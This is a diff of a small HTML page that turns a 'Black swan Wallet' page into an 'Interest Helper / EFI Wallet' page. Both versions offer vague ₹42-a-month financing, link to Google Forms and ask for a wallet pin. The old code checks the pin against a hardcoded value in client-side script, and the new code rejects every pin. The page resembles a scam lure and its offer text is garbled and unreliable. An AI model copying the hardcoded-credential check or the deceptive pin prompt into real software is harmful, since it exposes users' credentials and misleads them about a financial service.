@@ -1,202 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet</title>
-    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/GP8TJvP/logo.png">
+    <title>Interest Helper</title>
+    <link rel="icon" type="image/x-icon" href="https://i.pinimg.com/736x/b1/22/aa/b122aa7930d0e08092f394b44fd3f4c3.jpg">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Libre+Bodoni:wght@400;700&display=swap">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Josefin+Sans:ital,wght@0,100..700;1,100..700&family=Orbitron:wght@400..900&family=Red+Hat+Display:ital,wght@0,300..900&family=Strait&display=swap');
-
-        * {
-            font-family: "Red Hat Display", sans-serif;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Libre Bodoni', serif;
+            background-color: #f8f0e3; /* Beige background for a classic look */
+            color: #2c2c2c; /* Dark gray text */
             margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            color: #000000;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-        }
-        a{
-            text-decoration: underline;
-            color: #007bff;
-        }
-        .container {
-            position: fixed;
-            padding: 35px;
-            top: 10%;
-        }
-
-        h1 {
-            font-size: 22px;
-            font-weight: 500;
-            position: fixed;
-            left: 0;
-            background: #6e6e6e4a;
-            width: 100%;
-            padding: 9px 35px;
-            color: black;
-        }
-
-        h2 {
-            font-size: 3em;
-            margin: -27px 0 32px 0;
-            line-height: 1.1em;
-            font-weight: 400;
-        }
-
-        p {
-            font-size: 1em;
-            line-height: 1.6em;
-            margin: 13px 0;
-            color: #333;
-            font-weight: 600;
-        }
-
-        .button {
-            display: inline-block;
-            padding: 10px 15px;
-            font-size: 1em;
-            color: #ffffff;
-            background-color: #007BFF;
-            text-decoration: none;
-            border-radius: 5px;
-            margin-top: 10px;
-            letter-spacing: 1.5px;
-        }
-
-        .link {
-            font-size: 0.9em;
-            color: #007BFF;
-            position: fixed;
-            left: 52%;
-            text-decoration: none;
-        }
-
-        .link:hover {
-            text-decoration: underline;
-        }
-
-        .container img {
-            width: 80%;
-            position: relative;
-    bottom: 57px;
-    right: -79px;
-        }
-
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background-color: #fefefe;
-            margin: auto;
             padding: 20px;
-            border: 1px solid #888;
-            width: 80%;
-            max-width: 400px;
-            border-radius: 10px;
         }
-
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
+        .logo {
+        position: fixed;
+        top: 6px;
+        font-size: 30px;
+    }
+    input {
+        padding: 7px 14px;
+    }
+    a{
+        text-decoration: none;
+    }
+    p{
+        font-weight: 800;
+    }
+        .content {
+            max-width: 800px;
+            margin: 10em auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
-
-        .close:hover,
-        .close:focus {
-            color: black;
-            text-decoration: none;
-            cursor: pointer;
-        }
-
-        .modal button {
-            margin-top: 15px;
-            padding: 10px;
-            width: 100%;
-            border: none;
-            background-color: #007BFF;
-            color: #ffffff;
-            font-size: 1em;
-            border-radius: 5px;
+        .extra{
+            position: relative;
+    text-align: center;
+    bottom: 45px;
         }
     </style>
 </head>
-
 <body>
     <div class="logo">
-        <h1>Black swan<spans style="color: #0c008b;position: fixed;
-            left: 153px;
-            font-weight: 400;">Wallet</spans></h1>
+        Interest Helper
     </div>
-    <div class="container">
-        <h2>Buy it<br>to make it<br> permanent.</h2>
-        <p>For just ₹42 a month, you can get our wallet service that offers low-interest financing. It's a simple and affordable way to access the money you need without high costs.</p>
-        <a href="https://forms.gle/CWAxLH3JGYjyZ9Yu8" class="button">Get started</a>
-        <p>Verify my wallet? <a href="javascript:void(0)" onclick="openModal()"> Verify now</a>.</p><br><br>
-        <img src="https://lh3.googleusercontent.com/pV6CLDCWX-d2tTzyejuGnJV7l8_bMr0C--KS3b2uh_KrkB7BAbz3w5GZUPspU6TxGQJ4K0rvjecEyIRSrAcoqA-SfK6hEwN4T9BtWw=w1260-h1162-p-nu-pa" alt="">
-    </div>
-
-    <!-- Modal -->
-    <div id="myModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal()">&times;</span>
-            <p>Enter your wallet pin:</p>
-            <input type="password" id="userInput" placeholder="Enter pin" style="width: 100%; padding: 10px; margin-top: 10px;outline: none;">
-            <p id="modal-message" style="color: red; margin-top: 10px;"></p>
-            <button onclick="checkPassword()">Open wallet</button>
+    <a style="    color: black;
+    position: fixed;
+    top: 89px;
+    right: 27px;
+" href="https://forms.gle/Mp8itfWTVKmhvvbp9">Apply</a>
+    <div class="content">
+        <div class="offers">
+            <p>For just ₹42 a month, you can get our wallet service to clear the finace delay due. It's a simple and affordable way to access to reduce your money you need without high costs.</p>
         </div>
+        <hr>
+        <h2>EFI Wallet</h2>
+        <form id="passwordForm" onsubmit="return validatePasswords()">
+            <input type="password" id="password" name="password" placeholder="Enter the wallet pin" required><br><br>
+            <script>
+                function validatePasswords() {
+                    var password = document.getElementById("password").value;
+                    if (password === "") {
+                        alert("You didn't entered any pin.");
+                    } else {
+                        alert("User not exists in Wallet.");
+                        return false;  // Prevent form submission
+                    }
+                }
+            </script>
+            <input type="submit" value="Submit">
+        </form>
     </div>
-
-    <script>
-        // Function to open the modal
-        function openModal() {
-            document.getElementById("myModal").style.display = "flex";
-        }
-
-        // Function to close the modal
-        function closeModal() {
-            document.getElementById("myModal").style.display = "none";
-        }
-
-        // Function to check the password
-        function checkPassword() {
-            var userInput = document.getElementById("userInput").value;
-            var message = document.getElementById("modal-message");
-
-            if (userInput === "9919") {
-                window.location.href = "acc1.html";
-            } else if(userInput =""){
-                message.textContent = "Enter something.";
-            }
-            else {
-                message.textContent = "Wrong code / Account not exists";
-            }
-        }
-    </script>
+    <div class="extra">
+        We hope we helped you
+    </div>
 </body>
-
 </html>
